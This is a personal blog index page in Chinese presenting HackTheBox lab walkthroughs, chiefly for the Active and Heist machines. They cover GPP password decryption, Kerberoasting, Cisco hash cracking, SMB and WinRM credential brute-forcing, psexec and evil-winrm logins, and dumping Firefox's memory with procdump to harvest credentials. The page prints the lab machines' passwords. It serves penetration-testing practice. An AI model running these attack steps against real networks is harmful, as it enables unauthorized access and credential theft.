<!DOCTYPE html><html><head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  Ikonw Blog </title>

 
  
    <link rel="icon" href="/images/avatar.jpg">
  


  
<link rel="stylesheet" href="/nayo.min.css">
 
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head>  
  <body>   
    
      <header class="header-wrapper">
  <nav class="inner">
    <div class="title">
      <a href="/">
        <img class="logo" src="/images/logo.png">
      </a>
    </div>

    <ul class="menu">
      <li class="item">
        <a class="link" id="menu-home" href="/"> <!-- Home -->
          <i class="iconfont icon-home"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
          <i class="iconfont icon-archives"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
          <i class="iconfont icon-tags"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-about" href="/about"> <!-- About -->
          <i class="iconfont icon-about"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-search"> <!-- Search -->
          <i class="iconfont icon-search"></i>
        </a>
      </li>
    </ul>
  </nav>
</header>


<header class="mobile-header-wrapper">
  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
</header>   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          


<div class="index slideDownMin">
	

	<div class="profile">

		<img class="avatar" src="/images/avatar.jpg">

		<p class="author">Ikonw</p>

<div class="social">

<a class="iconfont icon-Github" target="_blank" href="https://github.com/Ik0nw" title="Github">
</a>

<a class="iconfont icon-Telegram" target="_blank" href="https://t.me/ikonwwww" title="Telegram">
</a>

</div>
	</div>


	

	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/05/12/HTB-cache/">HTB Cache Writeup</a>  
	       
		 

		<div class="meta">
			<time>May 12, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		
			<p>Cache writeup available</p>
		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/HackTheBox-Medium/">HackTheBox-Medium</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/05/12/HTB-cache/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/02/10/HTB-Active/">HTB Active Writeup</a>  
	       
		 

		<div class="meta">
			<time>Feb 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200210210254278.png" alt="在这里插入图片描述"></p>
<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>这边我用的是我在OSCP时候用的一个脚本工具（懒惰）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a><br><img src="/images/old-machine-images/202002102107263.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./nmapAutomator.sh 10.10.10.100 Full</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>除了53和445并没有什么特别能交互的端口</p>
<figure class="highlight less"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="number">7.80</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2020-02-10 18:56 +08</span></span><br><span class="line">Nmap scan report for <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.23s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| <span class="attribute">dns-nsid</span>: </span><br><span class="line">|_  bind.<span class="attribute">version</span>: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="attribute">time</span>: <span class="number">2020</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">27</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds?</span><br><span class="line"><span class="number">464</span>/tcp   open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">|<span class="attribute">_http-title</span>: <span class="keyword">Not</span> Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49182</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">Host</span>: DC; <span class="attribute">OS</span>: Windows; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:<span class="attribute">windows_server_2008</span>:<span class="attribute">r2</span>:sp1, <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:windows</span><br><span class="line"></span><br><span class="line">Host script <span class="attribute">results</span>:</span><br><span class="line">|<span class="attribute">_clock-skew</span>: <span class="number">38s</span></span><br><span class="line">| <span class="attribute">smb2-security-mode</span>: </span><br><span class="line">|   <span class="number">2.02</span>: </span><br><span class="line">|_    Message signing enabled <span class="keyword">and</span> required</span><br><span class="line">| <span class="attribute">smb2-time</span>: </span><br><span class="line">|   <span class="attribute">date</span>: <span class="number">2020</span><span class="attribute">-02-10T10</span>:<span class="number">58</span>:<span class="number">25</span></span><br><span class="line">|_  <span class="attribute">start_date</span>: <span class="number">2020</span><span class="attribute">-02-10T08</span>:<span class="number">17</span>:<span class="number">06</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">194.25</span> seconds</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546</span></span><br></pre></td></tr></tbody></table></figure>

<h1 id="一，SMB-ENUMERATION"><a href="#一，SMB-ENUMERATION" class="headerlink" title="一，SMB ENUMERATION"></a>一，SMB ENUMERATION</h1><p>首先 使用smbmap 来确定anonymous用户的权限（如果有写权限可以直接用impacket 来获取shell）</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>发现对 <strong>Replication</strong> 文件夹 <strong>READ ONLY</strong>权限<br><img src="/images/old-machine-images/20200210211447140.png" alt="在这里插入图片描述"><br>（这里我本来想使用mount挂载smb, 但失败了。有成功的可以在评论告诉我。）</p>
<p>使用 smbclient进行连接 <strong>Replication</strong></p>
<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>10.10.10.100<span class="symbol">\\</span>Replication</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>发现两个有意思的文件夹</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">31B2F340</span>-<span class="number">016</span>D-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04FB984F9 是Default admin policy</span><br><span class="line"><span class="attribute">6AC1786C</span>-<span class="number">016</span>F-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04fB984F9 是Default domain polices</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/2020021021181611.png" class="lazyload"><br>如果没记错的话 windows server 2012以下的版本 会把密码储存在GPO。<br>经过一番查找<br><strong>smb: \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups</strong></p>
<p>在此目录发现Groups.xml</p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210212552448.png" class="lazyload"><br>发现帐号和密码哈希值</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">帐号：active.htb\SVC_TGS</span><br><span class="line">哈希值：edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以使用kali自带的gpp-decrypt来破解密码</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>得到密码 <strong>GPPstillStandingStrong2k18</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210212726788.png" class="lazyload"><br>现在我们有了新的帐号 利用Smbmap确认我们是否有写的权限（拿shell）</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span> -u SVC_TGS -p GPPstillStandingStrong2k18</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210213100537.png" class="lazyload"><br>发现能读权限能读到user目录里的文件<br>可以用smbclient 进去拿user.txt</p>
<h1 id="三，ROOT"><a href="#三，ROOT" class="headerlink" title="三，ROOT"></a>三，ROOT</h1><p>之前看到 端口88 有 kerberos 在运行。尝试利用kerberoasing 攻击</p>
<p><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/094369852800.htm">Kerberoasing 攻击</a></p>
<p>利用 impacket-GetUserSPNs</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/impacket-GetUserSPNs -request active.htb/</span>SVC_TGS:GPPstillStandingStrong2k18 -dc-ip <span class="number">10.10</span>.<span class="number">10.100</span> </span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210221812462.png" class="lazyload"><br>得到hash后 利用john the ripper进行破解<br>得到 Administrator密码为 Ticketmaster1968<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/202002102219053.png" class="lazyload"></p>
<p>取到帐号和密码后 我们可以使用 impacket psexec 进行登录</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>psexec.py active.htb/Administrator:Ticketmaster1968@<span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210222712526.png" class="lazyload"></p>
<p>成功 拿到Administrator</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			            
				<a class="link" href="/tags/smb/">smb</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/02/10/HTB-Active/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/26/HTB-Heist/">HTB Heist Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 26, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<h1 id="No-4-Heist-难度简单-HTB-walkthrough"><a href="#No-4-Heist-难度简单-HTB-walkthrough" class="headerlink" title="No.4-Heist-难度简单-HTB-walkthrough"></a>No.4-Heist-难度简单-HTB-walkthrough</h1><p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126112412354.png" class="lazyload"></p>
<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sV -sC heist.htb</span><br><span class="line">1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> heist.htb (10.10.10.149)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php                                                                                                                                                                                                         </span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                          </span><br><span class="line">445/tcp open  microsoft-ds?                                                                                                                                                                                                                </span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Host script results:                                                                                                                                                                                                                       </span><br><span class="line">|_clock-skew: 4s                                                                                                                                                                                                                           </span><br><span class="line">| smb2-security-mode:                                                                                                                                                                                                                      </span><br><span class="line">|   2.02:                                                                                                                                                                                                                                  </span><br><span class="line">|_    Message signing enabled but not required                                                                                                                                                                                             </span><br><span class="line">| smb2-time:                                                                                                                                                                                                                               </span><br><span class="line">|   <span class="built_in">date</span>: 2020-01-25T01:23:05                                                                                                                                                                                                              </span><br><span class="line">|_  start_date: N/A                                                                                                                                                                                                                        </span><br><span class="line">1234567891011121314151617181920212223242526</span><br></pre></td></tr></tbody></table></figure>

<h1 id="二，HTTP-Enumeration"><a href="#二，HTTP-Enumeration" class="headerlink" title="二，HTTP Enumeration"></a>二，HTTP Enumeration</h1><p>进入web, 是个登陆页面。 并没有找到CMS, 右下角有个 <strong>Login as guest</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126114331293.png" class="lazyload"><br>发现这是个 类似于 <strong>Support desk</strong> 的平台。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126113042235.png" class="lazyload"><br>点击 Attachment 跳转到 config.txt</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization <span class="built_in">exec</span> SSH</span><br><span class="line"> transport input ssh</span><br><span class="line">1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></pre></td></tr></tbody></table></figure>

<p>其中有三行是包含哈希值的</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span>  // Type 5 </span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713 //Type 7 </span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 //type 7 </span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>

<p>按照之前所说的，这应该分别CISCO的哈希值。<br>分别为 type 5 跟 type 7。type 5是有salt过的。<br>利用网上的工具来进行破解。</p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126114855103.png" class="lazyload"><br>Type 5 的比较麻烦，网上的工具没能找到密码。<br>找到一个 <a target="_blank" rel="noopener" href="https://github.com/axcheron/cisco_pwdecrypt">github脚本</a>。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126115301683.png" class="lazyload"><br>现在我们已经找到全部的账号和密码</p>
<table>
<thead>
<tr>
<th>账号</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>$uperP@ssword</td>
</tr>
<tr>
<td>rout3r</td>
<td>Q4)sJu\Y8qz*A3?d</td>
</tr>
<tr>
<td>Hazard</td>
<td>stealth1agent</td>
</tr>
</tbody></table>
<h1 id="三，拿到shell"><a href="#三，拿到shell" class="headerlink" title="三，拿到shell"></a>三，拿到shell</h1><p>尝试使用现有的账号和密码 来登陆网页，但提示需要用邮箱。利用了例子如 <strong><a href="mailto:admin@heist.htb">admin@heist.htb</a></strong><br>也没有进展。</p>
<p>利用metasploit 的smblogin 来进行爆破。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/202001261158540.png" class="lazyload"><br>发现只有 <strong>Hazrd:stealth1agent</strong> 可以登陆<br>发现权限都是No Access和READ。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@xing<span class="comment"># smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 10.10.10.149...</span><br><span class="line">[+] IP: 10.10.10.149:445        Name: 10.10.10.149                                      </span><br><span class="line">        Disk                                                    Permissions</span><br><span class="line">        ----                                                    -----------</span><br><span class="line">        ADMIN$                                                  NO ACCESS</span><br><span class="line">        C$                                                      NO ACCESS</span><br><span class="line">        IPC$                                                    READ ONLY</span><br><span class="line">123456789</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
</blockquote>
<p>在这里我们可以利用 <strong>READ ONLY</strong> 的IPC$来取得本地账号的信息。</p>
<p>利用rpclient来连接</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">"Hazard%stealth1agent"</span> heist.htb</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126121648687.png" class="lazyload"><br>我们也可以同样利用SID来获取用户名<br>sid的后四位是用户的编号，我们可以通过逐渐增加来找到本机的用户名字</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126121846444.png" class="lazyload"><br>发现多三个用户为 Chase,support,Jason。</p>
<p>另外一个方法是用 <strong>impacket</strong> (好东西呀）。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@xing:/opt<span class="comment"># locate lookupsid.py</span></span><br><span class="line">/usr/share/doc/python3-impacket/examples/lookupsid.py</span><br><span class="line"></span><br><span class="line">root@xing:/opt<span class="comment"># python /usr/share/doc/python3-impacket/examples/lookupsid.py Hazard:stealth1agent@10.10.10.149</span></span><br><span class="line">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at 10.10.10.149</span><br><span class="line">[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></tbody></table></figure>

<p>尝试了各种组合还是无法登陆smb或者web。<br>于是决定再扫一遍nmap 看看有没有什么高端口是漏掉的。<br>发现了5985端口开着</p>
<blockquote>
<p>WinRM 是windows 一种方便远程管理的服务；开启winrm service,便于在日常工作中，远程管理服务器，或通过脚本，同时管理多台服务器，来提高工作效率</p>
</blockquote>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126145922341.png" class="lazyload"><br>这边可以利用一种工具叫evil-winrm 来进行登陆。</p>
<p>有兴趣的可以了解更多<br><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/58739/">Evil-winRM 远程管理shell</a></p>
<p>首先，利用metasploit 的 <strong>scanner/winrm/winrm_login</strong> 模块来爆破帐号和密码。<br>（这么多帐号和密码 到底哪个密码是哪个呀）。</p>
<p>把新取得的账号 全部保存进 possible_user。<br>然后根据lookupsid取得的 DOMAIN填写。</p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126150720402.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126150815832.png" class="lazyload"></p>
<p>成功取得有效登陆</p>
<p><strong>Chase:Q4)sJu\Y8qz*A3?d</strong></p>
<p>利用evil-winrm 进行登陆</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p <span class="string">"Q4)sJu\Y8qz*A3?d"</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126151024557.png" class="lazyload"></p>
<h1 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h1><p>一番探索后 发现有 <strong>firefox</strong> 的程序再跑<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/2020012615214765.png" class="lazyload"><br>利用微软的procdump把 firefox的日志</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></p>
<p>利用 evil-winrm 上传 procdump.exe 然后执行</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">upload proxdump.exe</span><br><span class="line">procdump -ma 2892</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>

<p>后面用 grep 找出admin 后发现密码。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126170033546.png" class="lazyload"><br>使用evil win-rm 登陆后 取到 root flag</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/26/HTB-Heist/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/22/HTB-jarvis/">HTB Jarvis Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 22, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<blockquote>
<p>挺有意思的一台机器，有挺多种方式拿 low priv shell。</p>
</blockquote>
<p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122113820431.png" class="lazyload"></p>
<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>只有HTTP 比较有兴趣，title 是 <strong>Stark Hotel</strong></p>
